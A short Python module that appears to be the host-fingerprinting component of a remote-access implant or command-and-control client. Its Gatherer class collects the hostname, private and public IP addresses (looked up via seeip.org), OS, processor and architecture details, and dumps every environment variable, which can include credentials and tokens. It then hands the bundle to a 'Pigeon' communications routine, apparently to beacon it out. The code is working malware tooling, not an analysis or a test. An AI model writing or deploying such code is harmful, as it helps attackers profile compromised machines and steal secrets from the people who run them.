import os
from .pigeon import Pigeon
import platform
from requests import ConnectionError, get
import socket

def getPubIP() -> str:
    ip = ""
    try:
        ip += get("https://ipv4.seeip.org").content.decode()
        ip += ", {}".format(get("https://ipv6.seeip.org").content.decode())
    except ConnectionError:
        ip += "error retrieving"
    return ip

class Gatherer:
    def __init__(self) -> None:
        self.info: str = ""
        self.uid: str = os.urandom(24).hex()
        self.info += "UUID: {}".format(self.uid) 
        self.info += " | Hostname: {}".format(socket.gethostname())
        self.info += " | PrivIP: {}".format(socket.gethostbyname(socket.gethostname()))
        self.info += " | PubIP: {}".format(getPubIP())
        self.info += " | OS: {} {} {}".format(platform.system(),platform.version(),platform.release())
        self.info += " | Processor: {}".format(platform.processor())
        self.info += " | Arch: {}".format(platform.machine())
        self.info += " | Envs: {}".format(os.environ)
        Pigeon.initComs(self.uid, self.info)
